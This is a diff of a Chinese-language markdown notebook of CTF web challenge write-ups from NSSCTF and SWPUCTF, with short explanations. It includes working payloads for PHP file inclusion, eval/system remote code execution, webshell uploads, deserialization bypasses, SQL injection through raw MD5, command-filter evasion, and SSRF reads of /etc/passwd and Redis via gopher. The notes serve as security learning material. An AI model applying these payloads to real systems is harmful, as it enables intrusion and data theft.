@@ -1,8 +1,8 @@
-1.[SWPUCTF 2021 新生赛]gift_F12
+# 1.[SWPUCTF 2021 新生赛]gift_F12
 
 F12
 
-2.[SWPUCTF 2021 新生赛]jicao
+# 2.[SWPUCTF 2021 新生赛]jicao
 
 playload:
 
@@ -11,13 +11,13 @@ GET: /?json{"x":"wllm"}
 POST: id=wllmNB
 ```
 
-3.[SWPUCTF 2021 新生赛]easy_md5
+# 3.[SWPUCTF 2021 新生赛]easy_md5
 
 观察代码，要求使用GET请求获得name，用POST请求获得password，并且要使得输入的name和password的MD5的值也要相同
 
 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的，所以只要寻找这样的字符就好了
 
-4.[SWPUCTF 2021 新生赛]include
+# 4.[SWPUCTF 2021 新生赛]include
 
 进入环境提示传入一个file，传入/?file=1,显示出源代码，通过阅读源代码
 
@@ -35,7 +35,7 @@ playload：
 /?file=php://filter/read/convert.base64encode/resource=flag.php
 ```
 
-5:[SWPUCTF 2021 新生赛]easy_sql
+# 5:[SWPUCTF 2021 新生赛]easy_sql
 
 学习了一遍数据库的基本操作，由于我的操作系统是arch，所以使用了MariaDB来练习，将MariaDB连接vscode进行练习。
 
@@ -122,7 +122,7 @@ table_schema这是 `information_schema.tables` 表中的一个列，表示表所
 
 补充：
 
-6.[SWPUCTF 2021 新生赛]easyrce
+# 6.[SWPUCTF 2021 新生赛]easyrce
 
 题目介绍是rce漏洞，rce为远程代码执行漏洞，观察代码可以得到
 
@@ -159,7 +159,7 @@ $command : 要执⾏的命令。
 需要注意的是，使⽤ system() 或其他⽤于执⾏外部命令的函数时必须⾮常⼩⼼，特别是
 当命令中包含⽤户提供的数据时。否则，你的应⽤程序将容易受到命令注⼊攻击。
 
-7.[SWPUCTF 2021 新生赛]caidao
+# 7.[SWPUCTF 2021 新生赛]caidao
 
 观察代码是一个用利用post请求的rce漏洞，eval函数导致的
 
@@ -172,7 +172,7 @@ wllm=system("ls /");
 wllm=system("cat /flag");
 ```
 
-8.[SWPUCTF 2021 新生赛]Do_you_know_http
+# 8.[SWPUCTF 2021 新生赛]Do_you_know_http
 
 关于http协议的题
 
@@ -204,7 +204,7 @@ X-Forwarded-For:127.0.0.1    （这个语句放在第三行左右，放在最后
 
 访问./secretttt.php得到flag
 
-9.[SWPUCTF 2021 新生赛]babyrce
+# 9.[SWPUCTF 2021 新生赛]babyrce
 
 观察代码，可以得到，我们要首先把cookie中admin的值设为1
 
@@ -257,7 +257,7 @@ cat,flag.php(用逗号当作空格)
 
 得到flag
 
-10.[SWPUCTF 2021 新生赛]ez_unserialize
+# 10.[SWPUCTF 2021 新生赛]ez_unserialize
 
 ![1743126109221](image/NSS/1743126109221.png)
 
@@ -320,11 +320,11 @@ ok，现在我们得到了一个序列化后的代码，用get方法传入
 ?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";} 
 ```
 
- 反序列化后对象满足 `__destruct()` 条件，输出flag。
+反序列化后对象满足 `__destruct()` 条件，输出flag。
 
 补充！
 
- `__construct()`是原程序的默认赋值操作，但是反序列化生成的对象的属性值直接覆盖了类定义中的默认值（如果有），但实际是**绕过**了构造函数中的赋值逻辑，原程序的赋值操作被跳过了，反序列话优先级高
+`__construct()`是原程序的默认赋值操作，但是反序列化生成的对象的属性值直接覆盖了类定义中的默认值（如果有），但实际是**绕过**了构造函数中的赋值逻辑，原程序的赋值操作被跳过了，反序列话优先级高
 
 **__destruct() 的核心特性**
 
@@ -348,7 +348,7 @@ ok，现在我们得到了一个序列化后的代码，用get方法传入
 
 `__destruct()`：对象**销毁时**调用（反序列化时会触发）。
 
-11.[SWPUCTF 2021 新生赛]easyupload2.0
+# 11.[SWPUCTF 2021 新生赛]easyupload2.0
 
 进入一看这是一个文件上传的题目
 
@@ -399,7 +399,7 @@ print(response.text)
 
 或者可以使用其他的一些工具，例如蚁剑
 
-12. [SWPUCTF 2021 新生赛]easyupload1.0
+# 12. [SWPUCTF 2021 新生赛]easyupload1.0
 
 进入网站发现是一个文件上传的页面
 
@@ -437,7 +437,7 @@ curl -X POST -d "cmd=system('env');"http://node7.anna.nssctf.cn:27834/upload/one
 
 ！注意环境变量中也可以寻找线索
 
-13.[SWPUCTF 2021 新生赛]no_wakeup
+# 13.[SWPUCTF 2021 新生赛]no_wakeup
 
 产看页面代码发现这是一个反序列化的题目
 
@@ -489,7 +489,7 @@ __weakup（）函数的作用：
 * 通过 `unserialize()` 反序列化对象时。
 * 序列化字符串中声明的属性数量 **严格等于** 类实际定义的属性数量（否则会被跳过，如你提到的绕过场景）。
 
-14.[SWPUCTF 2021 新生赛]PseudoProtocols
+# 14.[SWPUCTF 2021 新生赛]PseudoProtocols
 
 查看这道题目，发现需要考查php伪协议
 
@@ -537,7 +537,7 @@ curl -X POST -d "I want flag" http://node7.anna.nssctf.cn:29262/test222222222222
 
 ![1744339157025](image/NSS/1744339157025.png)
 
-15.[NCTF 2018]签到题
+# 15.[NCTF 2018]签到题
 
 bp抓包
 
@@ -549,7 +549,7 @@ bp抓包
 
 ![1744340810230](image/NSS/1744340810230.png)
 
-16.[SWPUCTF 2021 新生赛]hardrce
+# 16.[SWPUCTF 2021 新生赛]hardrce
 
 题目是一个无字母RCE绕过，前面做过rce漏洞的题目，通过eval函数构造执行就可以了，但是此题目会屏蔽某些特殊符号和大小写字母
 
@@ -606,21 +606,21 @@ echo $b;
 
 得到flag
 
-![1744648291412](image/NSS/1744648291412.png)17.[第五空间 2021]签到题
+# ![1744648291412](image/NSS/1744648291412.png)17[第五空间 2021]签到题
 
 ![1744767765925](image/NSS/1744767765925.png)
 
 直接替换为NSSCTF{}提交就可
 
-18.[陇剑杯 2021]签到
+# 18.[陇剑杯 2021]签到
 
 分析附件发现很多http协议报文，还有很多403响应，根据题目要填写NSSCTF{http}
 
-19. [广东强网杯 2021 个人决赛]签到题
+# 19. [广东强网杯 2021 个人决赛]签到题
 
 下载附件解压后就可以得到flag
 
-20.[陇剑杯 2021]jwt（问1）
+# 20.[陇剑杯 2021]jwt（问1）
 
 下载附件用wireshark打开，分析->追踪流->http
 
@@ -630,7 +630,7 @@ echo $b;
 
 （/identity” 通常是一个 HTTP 请求路径，用于与身份（identity）相关的操作）
 
-21.[长城杯 2021 院校组]签到
+# 21.[长城杯 2021 院校组]签到
 
 得到一串十六进制数5a6d78685a3374585a57786a6232316c5833527658324e6f5957356e5932686c626d64695a544639
 
@@ -638,7 +638,7 @@ echo $b;
 
 ![1744907156457](image/NSS/1744907156457.png)
 
-22.[SWPUCTF 2022 新生赛]ez_ez_php
+# 22.[SWPUCTF 2022 新生赛]ez_ez_php
 
 题目的标签中含有php伪协议，文件包含等，进入题目环境，查看代码
 
@@ -666,11 +666,11 @@ substr（）函数要求传入get请求的代码前三位必须是php，所以�
 
 ![1744943086440](image/NSS/1744943086440.png)
 
-23.[SWPUCTF 2021 新生赛]error
+# 23.[SWPUCTF 2021 新生赛]error
 
 使用sqlmap先做完题（再学习一遍sql查询的命令！！！！！！！！！！)
 
-24.[陇剑杯 2021]webshell（问1）
+# 24.[陇剑杯 2021]webshell（问1）
 
 题目要求用wireshark进行流量分析，然后找到黑客登录用的密码
 
@@ -691,7 +691,7 @@ x3.一般进入的是login页面
 
 flag为NSSCTF{`Admin123!@#`}
 
-25.[SWPU 2019]神奇的二维码
+# 25.[SWPU 2019]神奇的二维码
 
 下载附件，是一个二维码扫描后发现是一个假的flag
 
@@ -743,7 +743,7 @@ binwalk -e '/home/kali/Desktop/MISC-神奇的二维码-BitcoinPay.png'
 NSSCTF{morseisveryveryeasy}
 ```
 
-26.[SWPUCTF 2021 新生赛]easyupload3.0
+# 26.[SWPUCTF 2021 新生赛]easyupload3.0
 
 这是一个文件上传问题，首先尝试上传一句话木马，发现被阻止了。
 
@@ -776,7 +776,7 @@ sctf.cn:21624/upload/1.jpg
 
 得到flag
 
-27.[SWPUCTF 2021 新生赛]pop
+# 27.[SWPUCTF 2021 新生赛]pop
 
 查看源代码，发现是一个反序列化的题目
 
@@ -842,10 +842,11 @@ w33m的__toString方法会调用w00m属性的方法（方法名由w22m属性指�
 
 先进行
 
-28.[SWPUCTF 2021 新生赛]finalrce
+# **28.[SWPUCTF 2021 新生赛]finalrce**
 
-| 方面                 | `exec()`                                         | `eval()`                                            |
-| -------------------- | -------------------------------------------------- | ----------------------------------------------------- |
+
+| 方面           | `exec()`                                           | `eval()`                                              |
+| -------------- | -------------------------------------------------- | ----------------------------------------------------- |
 | **用途**       | 用于执行外部系统命令（如操作系统命令）。           | 用于执行 PHP 代码字符串。                             |
 | **执行机制**   | 在操作系统层面执行命令。                           | 在 PHP 解释器层面执行代码。                           |
 | **安全性风险** | 可能导致命令注入攻击。                             | 可能导致代码注入攻击。                                |
@@ -881,7 +882,6 @@ w33m的__toString方法会调用w00m属性的方法（方法名由w22m属性指�
 /?url=tac /flllll\aaaaaaggggggg | tee 3.txt
 访问得到flag
 
-
 由于cat被过滤，我们可以用tac命令
 
 ```
@@ -902,4 +902,142 @@ w33m的__toString方法会调用w00m属性的方法（方法名由w22m属性指�
 
 ![1746759199899](image/NSS/1746759199899.png)
 
-29.
+# 29.[LitCTF 2023]我Flag呢？
+
+直接查看CTRL+U查看源代码
+
+![1758867255946](images/NSS/1758867255946.png)
+
+# 30.[NSSCTF 2022 Spring Recruit]ezgame
+
+这是一个js分析题目有两种做法:
+
+1.可以直接F12在代码中找到flag
+
+![1758868773158](images/NSS/1758868773158.png)
+
+2.发现通关要求是超过65分
+
+![1758868813175](images/NSS/1758868813175.png)
+
+那就在控制台将分数改为超过65分,然后重新开一局就可以得到flag
+
+![1758868850414](images/NSS/1758868850414.png)![1758868886961](images/NSS/1758868886961.png)
+
+# 31:[NISACTF 2022]easyssrf
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+$file = $_GET["file"];
+if (stristr($file, "file")){          // 大小写不敏感过滤
+    die("你败了.");
+}
+// flag in /flag
+echo file_get_contents($file);        // 触发 SSRF/伪协议读取
+?>
+//这是这类题目的原始代码,还可以在此基础上变体
+```
+本题是这样的
+
+![1758870596174](images/NSS/1758870596174.png)
+
+尝试获取一下flag
+
+```url
+file:///flag
+```
+提示我需要查看/fl4g
+
+```url
+file:///fl4g
+```
+提示查看ha1x1ux1u.php
+
+访问后看到源码,果然是一类题目
+
+![1758873385013](images/NSS/1758873385013.png)
+
+接着使用,得到flag
+
+```url
+?file=/flag
+```
+注:
+
+```study
+file_get_contents($file)//读取文件内容的内置函数，功能简洁且常用，主要作用是将整个文件（或网络资源）的内容读取为一个字符串
+```
+
+| 目标            | 绕过思路         | 实际 payload                                                           |
+| --------------- | ---------------- | ---------------------------------------------------------------------- |
+| 直接读`/flag`   | 不用 file 关键字 | `?file=/flag`                                                          |
+| 伪协议读`/flag` | 避开 file 字母   | `?file=php://filter/read=convert.base64-encode/resource=/flag`         |
+| 目录穿越读 flag | 没过滤 ../       | `?file=../../../../flag`                                               |
+| 读当前源码      | 伪协议 + base64  | `?file=php://filter/read=convert.base64-encode/resource=ha1x1ux1u.php` |
+
+ssrf可以做
+
+1. 读本地文件 `file:///etc/passwd`
+2. 扫内网端口 `http://192.168.1.x:22`
+3. 打内网服务 `gopher://127.0.0.1:6379/...`
+
+# 32.[BJDCTF 2020]easy\_md5
+
+查看题目只有一个输入框
+
+![1758875210831](images/NSS/1758875210831.png)
+
+随意输入一个东西然后查看F12,发现响应表头中有hint->提示
+
+![1758875445237](images/NSS/1758875445237.png)
+
+MySQL 中 `md5($pass, true)` 会返回 **二进制形式** 的 MD5 哈希值（而非默认的十六进制字符串）。如果这个二进制值中包含 `'`（单引号）等特殊字符，可能会闭合 SQL 语句中的引号，导致 SQL 注入。
+
+### 具体利用方式：
+
+我们需要找到一个字符串 `$pass`，使得它的 MD5 二进制哈希值包含 `'or'` 这样的序列，从而让原查询变成恒真条件。
+
+例如，若 `md5($pass, true)` 的结果为 `'or'xxx`（xxx 为其他字符），则原查询会被解析为：
+
+```sql
+select * from admin where password=' 'or'xxx'
+```
+此时 `'or'` 会使条件恒真（因为 `'or'` 两边只要有一个为真则整体为真），无需正确密码即可查询到 `admin` 表的数据。
+
+### 已知有效 payload：
+
+字符串 `ffifdyop`(万能密码)
+
+输入万能密码后
+
+![1758875925712](images/NSS/1758875925712.png)
+
+然后查看页面源代码
+
+![1758876323789](images/NSS/1758876323789.png)
+
+发现是php的弱比较("==")
+
+可以找两个科学计数法为0e开头的,比如
+
+a=QNKCDZO&b=s878926199a
+
+a=240610708&b=314282422
+
+```url
+?a=QNKCDZO&&b=s878926199a//成功绕过跳转到level114.php
+```
+![1758877284277](images/NSS/1758877284277.png)
+
+发现是强比较("===")
+
+给 `param1` 和 `param2` 各传一个**数组**，`md5()` 遇到数组会返回 `NULL`，于是
+`md5($param1) === md5($param2)` 变成 `NULL === NULL`，成立；
+而两个数组本身不相等，`$param1 !== $param2` 也成立，条件全满足，直接出 flag。
+
+![1758878624852](images/NSS/1758878624852.png)
+
+# 33.
